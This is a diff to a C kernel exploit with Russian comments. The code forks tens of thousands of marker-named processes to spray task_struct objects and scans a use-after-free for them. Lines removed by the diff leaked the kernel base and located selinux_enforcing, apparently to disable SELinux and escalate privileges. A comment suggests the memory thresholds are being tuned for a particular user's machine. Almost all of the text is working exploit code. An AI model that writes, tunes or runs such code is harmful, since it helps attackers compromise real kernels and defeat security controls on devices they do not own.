@@ -2649,19 +2649,20 @@ restart:;
 
     fprintf(stderr, "\n[11] Batch Spraying task_struct (Target: 100,000)\n");
     int total_limit = 100000;
-    int batch_size = 100;
+    int batch_size = 200; // Немного увеличим батч для скорости
     int total_sprayed = 0;
     int marker_found_global = 0;
-    int current_batch_start = 0;
+    int window_idx = 0;
 
     while (total_sprayed < total_limit && !marker_found_global) {
         double ram_usage = get_ram_usage_percentage();
         fprintf(stderr, "\r    [*] Sprayed: %d | RAM Usage: %.1f%% ... ", total_sprayed, ram_usage);
         
-        int reached_mem_limit = (ram_usage > 50.0);
+        // Увеличиваем порог до 85%, так как у пользователя база >50%
+        int reached_mem_limit = (ram_usage > 85.0);
         
-        if (!reached_mem_limit) {
-            // Спреим пачку
+        // Если памяти хватает ИЛИ это самый первый батч, спреим
+        if (!reached_mem_limit || total_sprayed == 0) {
             for (int i = 0; i < batch_size && total_sprayed < total_limit; i++) {
                 pid_t pid = fork();
                 if (pid == 0) {
@@ -2669,7 +2670,6 @@ restart:;
                     snprintf(proc_name, sizeof(proc_name), "%s%05d", MARKER_NAME, getpid());
                     prctl(PR_SET_NAME, proc_name, 0, 0, 0);
                     prctl(PR_SET_PDEATHSIG, SIGKILL);
-                    
                     while(1) { 
                         if (gbuf[0] == 0xab) {
                             if (getpid() == (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID])) {
@@ -2686,56 +2686,51 @@ restart:;
                     total_sprayed++;
                 }
             }
-            usleep(5000); // Краткая пауза
+            usleep(10000); // Даем системе время
         }
 
-        // Если достигли 90% памяти ИЛИ спрей закончен, запускаем сканирование
-        if (reached_mem_limit || total_sprayed >= total_limit) {
-            fprintf(stderr, "\n    [!] %s limit reached (RAM: %.1f%%). Starting scan...\n", 
-                    reached_mem_limit ? "Memory" : "Spray", ram_usage);
+        // Сканируем, если:
+        // 1. Достигли лимита памяти
+        // 2. Наспреили достаточно (кратно 1000)
+        // 3. Или это конец спрея
+        if (reached_mem_limit || (total_sprayed > 0 && total_sprayed % 1000 == 0) || total_sprayed >= total_limit) {
+            fprintf(stderr, "\n    [!] %s. Starting scan (Window %d)...\n", 
+                    reached_mem_limit ? "Memory limit (85%) reached" : "Batch complete", window_idx);
             
             int num_found = 0;
-            if (scan_uaf_for_nonzero_multi(fd, total_sprayed / batch_size, &num_found)) {
-                uint64_t leaked_base = find_kernel_base_from_task_va(*(uint64_t *)&gbuf[GBUF_TASK_VA]);
-                if (leaked_base != 0) {
-                    kernel_base = leaked_base;
-                    uint64_t auto_offset = find_offsets_auto(kernel_base);
-                    selinux_enforcing = kernel_base + (auto_offset != 0 ? auto_offset : SELINUX_OFFSET);
-                    
-                    if (selinux_enforcing == kernel_base + SELINUX_OFFSET) {
-                        selinux_enforcing = find_selinux_enforcing_via_kbase(fd, kernel_base);
-                    }
-
-                    if (selinux_enforcing != 0) {
-                        fprintf(stderr, "\n    [!!!] SUCCESS! Marker found, KBASE=0x%lx, SELINUX=0x%lx\n", 
-                                (unsigned long)kernel_base, (unsigned long)selinux_enforcing);
-                        marker_found_global = 1;
-                        break;
-                    } else {
-                        fprintf(stderr, "\n    [-] Marker found but failed to locate SELINUX. Continuing...\n");
-                    }
-                } else {
-                    fprintf(stderr, "\n    [-] Marker found but failed to leak KBASE. Continuing...\n");
-                }
+            if (scan_uaf_for_nonzero_multi(fd, window_idx++, &num_found)) {
+                fprintf(stderr, "\n    [!!!] SUCCESS! Marker found!\n");
+                marker_found_global = 1;
+                break; 
             }
             
-            // Если не нашли ИЛИ нашли не всё, чистим память
-            fprintf(stderr, "\n    [-] Total success not reached. Cleaning up old sprays to free memory...\n");
-            // Убиваем все созданные процессы
-            for (int i = 0; i < total_sprayed; i++) {
-                if (spray_ctrl[i].pid > 0) {
-                    pid_t target_pid = (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID]);
-                    if (spray_ctrl[i].pid != target_pid) {
-                        kill(spray_ctrl[i].pid, SIGKILL);
-                        waitpid(spray_ctrl[i].pid, NULL, 0);
+            // Если памяти мало, чистим старый спрей, чтобы освободить место для нового
+            if (reached_mem_limit) {
+                fprintf(stderr, "\n    [-] Cleaning up old sprays to free RAM (Target: 85%%)...\n");
+                for (int i = 0; i < total_sprayed; i++) {
+                    if (spray_ctrl[i].pid > 0) {
+                        pid_t target_pid = (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID]);
+                        if (spray_ctrl[i].pid != target_pid) {
+                            kill(spray_ctrl[i].pid, SIGKILL);
+                            waitpid(spray_ctrl[i].pid, NULL, 0);
+                        }
+                        spray_ctrl[i].pid = 0;
                     }
-                    spray_ctrl[i].pid = 0;
                 }
+                reap_all_children();
+                // Мы НЕ сбрасываем total_sprayed, чтобы продолжить спрей с новыми именами/PID
+                // Но фактически в памяти теперь 0 маркеров, поэтому спрей начнется "заново" по сути
+                // Но мы сдвигаем окно сканирования (window_idx уже инкрементирован)
+                usleep(500000);
             }
-            reap_all_children();
-            *(uint64_t *)&gbuf[GBUF_TASK_VA] = 0; // Reset to avoid stuck on bad page
-            fprintf(stderr, "    [+] Memory cleared. Continuing spray from %d...\n", total_sprayed);
-            usleep(1000000); 
+        }
+        
+        // Если мы ВООБЩЕ не можем спреить из-за RAM, просто сканируем разные окна
+        if (total_sprayed == 0 && reached_mem_limit) {
+            fprintf(stderr, "\n    [!] Baseline RAM too high. Scanning without spray...\n");
+            int num_found = 0;
+            scan_uaf_for_nonzero_multi(fd, window_idx++, &num_found);
+            sleep(1);
         }
     }
 
